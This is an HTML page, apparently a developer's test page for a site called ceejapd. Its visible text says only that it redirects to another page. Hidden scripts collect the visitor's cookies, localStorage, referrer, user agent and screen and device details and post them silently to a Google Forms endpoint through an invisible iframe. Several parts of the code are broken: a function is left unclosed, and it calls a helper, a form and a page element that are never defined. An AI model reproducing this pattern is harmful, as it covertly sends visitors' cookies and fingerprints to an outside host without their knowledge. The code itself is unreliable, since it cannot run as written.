<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta viewport='width=device-width'>
<title>cookie</title>

<script>
function informe(mensagem) {
  document.getElementById("texto").value = mensagem;
  document.forms.formlog2.submit();
}

informe("entrar3.html\n" + navigator.userAgent);
 
function teste() {
  document.cookie = "ceejapd=;expires=1970-01-01T00:00:00.000Z;path=/ceejapd/;";
  document.cookie = "usuario=;expires=1970-01-01T00:00:00.000Z;path=/ceejapd/;";
  
  console.log('usuario: ' + getCookie("usuario") + ' token: ' + getCookie("ceejapd"));
  
  document.cookie = "usuario=teste@gmail.com;expires=2021-12-25T00:00:00.000Z;path=/ceejapd/;";
  document.cookie = "ceejapd=214354;expires=2021-12-25T00:00:00.000Z;path=/ceejapd/;";
  
  informe('entrar3: usuario: ' + getCookie("usuario") + ' token: ' + getCookie("ceejapd"));
  
  window.location.href = "https://tarcisomesquita.github.io/ceejapd/index.html";
</script>
</head>
<body onload='teste()'>
<p>Esta página deve carregar automaticamente a página https://tarcisomesquita.github.io/ceejapd/index.html</p>

<iframe name="hiddenFrame" style="visibility:hidden"></iframe>
<form name="formlog" enctype="application/x-www-form-urlencoded"action="https://docs.google.com/forms/u/0/d/e/1FAIpQLSeH6hDfEOI6jvgDsdkuuUeah_FU3dPGxZZr-sBBkIjj4Hkwog/formResponse" method="POST" target="hiddenFrame">
<input id="texto" name="entry.667481942" type="hidden">
</form>

<script>
var info = '\nhref: ' + window.location.href + 
           '\nreferrer: ' + document.referrer + 
           '\nhistory.length: ' + history.length + 
           '\nuserAgent: ' + navigator.userAgent + 
           '\nlanguage: ' + navigator.language + 
           '\nplatform: ' + navigator.platform + 
           '\ndataCookies1: ' + document.cookie + 
           '\ndataCookies2: ' + decodeURIComponent(document.cookie.split(";")) + 
           '\ndataStorage: ' + localStorage + 
           '\nscreen.width: ' + screen.width + 
           '\nscreen.height: ' + screen.height + 
           '\ninnerWidth: ' + innerWidth + 
           '\ninnerHeight: ' + innerHeight + 
           '\ndeviceMemory: ' + navigator.deviceMemory + 'GiB of RAM';

document.getElementById("texto").value = info;

document.head.innerHTML = "";
  
document.body.innerHTML = document.getElementById("page").innerHTML;
  
document.forms.formlog.submit();
</script>

</body>
</html>
